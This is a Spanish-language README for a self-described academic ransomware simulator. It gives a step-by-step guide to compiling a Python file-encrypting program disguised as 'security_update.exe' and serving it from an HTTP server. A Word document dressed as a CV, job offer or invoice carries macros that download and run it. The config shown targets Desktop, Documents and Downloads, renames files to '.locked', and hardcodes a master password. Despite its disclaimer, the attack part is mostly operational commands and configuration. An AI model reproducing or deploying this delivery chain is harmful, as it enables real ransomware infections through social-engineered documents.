# 🦠 Simulador de Ransomware Académico (Versión Word con Macros)

⚠️ **ADVERTENCIA CRÍTICA**  
Este software es **EXCLUSIVAMENTE EDUCATIVO**.  
Solo usar en **máquinas virtuales completamente aisladas**, **sin conexión a internet** y con **permiso explícito**.

---

## 📋 Descripción del Proyecto

Este proyecto simula un ataque de ransomware que utiliza documentos **Word con macros** como vector de infección.  
Consta de **tres componentes principales**:

- **Servidor web local** – Sirve el payload malicioso  
- **Documento Word infectado** – Contiene macros que descargan y ejecutan el ransomware  
- **Herramienta de recuperación** – Permite revertir todos los cambios  

---

## 🎯 Qué hace realmente

### 🔐 Mecanismo de Ataque

1. El atacante crea un documento Word (`.docm`) con macros VBA maliciosas  
2. El atacante inicia un servidor web local que sirve el ejecutable del ransomware  
3. La víctima abre el documento Word y habilita las macros (ingeniería social)  
4. Las macros detectan la IP local y descargan el payload desde el servidor del atacante  
5. El ransomware se ejecuta y **encripta archivos usando AES-256**  
6. Se crean archivos `READ_ME.txt` en cada carpeta afectada  

### 📂 Archivos afectados

- **Extensiones**:  
  `.txt`, `.pdf`, `.docx`, `.xlsx`, `.jpg`, `.png`, `.zip`
- **Carpetas**:  
  Escritorio, Documentos, Descargas
- **Cambio**:  
  La extensión se modifica a `.locked`

---

## 🔧 Instalación y Configuración

### 1️⃣ Instalar dependencias (VM del atacante)

```bash
pip install cryptography pyinstaller python-docx pywin32
```

### 2️⃣ Compilar el ransomware principal

```bash
# Compila el ransomware como un ejecutable
pyinstaller --onefile --noconsole --name="security_update.exe" final.py
```

### 3️⃣ Preparar el servidor web

```bash
# Copia el ejecutable a una ubicación accesible
copy dist\security_update.exe C:\Users\%USERNAME%\Desktop\
```

---

## 🚀 Ejecución Paso a Paso

### 🧨 PRIMERA PARTE: Configurar el entorno del atacante

#### Paso 1: Iniciar el servidor web

```bash
cd C:\Users\%USERNAME%\Desktop
python -m http.server 8000
```

#### Paso 2: Obtener tu IP local

```bash
ipconfig
```

Anota la Dirección IPv4 (ejemplo: 192.168.1.100)

#### Paso 3: Modificar el script de creación del Word

Edita el archivo `word_macro_creator.py`:

```python
# Busca esta línea y cambia la IP
download_url = "http://192.168.1.100:8000/security_update.exe"
```

Reemplaza `192.168.1.100` por tu IP local.

#### Paso 4: Crear el documento Word malicioso

```bash
python word_macro_creator.py
```

Esto generará el archivo: `Curriculum.docm`

### 🎯 SEGUNDA PARTE: Ejecutar el ataque (VM víctima)

#### Paso 5: Transferir el documento a la VM víctima

- Copia `Curriculum.docm` a la máquina virtual de pruebas
- Asegúrate de que ambas VMs estén en la misma red virtual

#### Paso 6: Ejecutar el ataque

1. Abre `Curriculum.docm` en la VM víctima
2. Habilita las macros cuando Word lo solicite
3. Se descargará y ejecutará `security_update.exe`

#### Paso 7: Verificar la infección

- Los archivos cambiarán su extensión a `.locked`
- Aparecerán archivos `READ_ME.txt` en cada carpeta afectada

---

## 🔓 Recuperación de Archivos

### 🛠 Opción 1: Herramienta de recuperación incluida

```bash
security_update.exe --decrypt
```

### 🛠 Opción 2: Decryptor standalone

#### Compilar el decryptor (VM atacante)

```bash
pyinstaller --onefile --name="FileRecoveryTool" decryptor.py
```

#### Ejecutarlo en la VM víctima

```bash
FileRecoveryTool.exe
```

#### Contraseña de recuperación

```
Melointrodujeronymegustó___67
```

---

## ⚙️ Personalización

### 📄 Archivo final.py – Configuración principal

```python
# Carpetas objetivo
TARGET_DIRS = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Downloads")
]

# Extensiones a encriptar
FILE_EXTENSIONS = [
    '.txt', '.pdf', '.docx', '.xlsx', '.jpg', '.png', '.zip'
]

# Contraseña maestra (¡CÁMBIALA!)
MASTER_PASSWORD = "Melointrodujeronymegustó___67"
```

### 📄 Archivo word_macro_creator.py – Personalización del Word

```python
# Contenido del documento
document_content = "Curriculum Vitae\n\nNombre: [Tu Nombre]\n..."

# Nombre del archivo de salida
output_docm = "Oferta_Empleo.docm"
# Ejemplos alternativos:
# "Factura.docm", "Informe.docm"
```

---

## 📝 Para el Informe Académico

### 🔍 Técnicas implementadas

- **Ingeniería social** – Documentos Word aparentemente legítimos
- **Macros VBA maliciosas** – Código que se ejecuta al abrir el documento
- **Descarga desde servidor local** – Evita detección por servicios en la nube
- **Cifrado AES-256** – Algoritmo criptográfico estándar industrial
- **Ofuscación por servidor** – El payload no está embebido en el documento
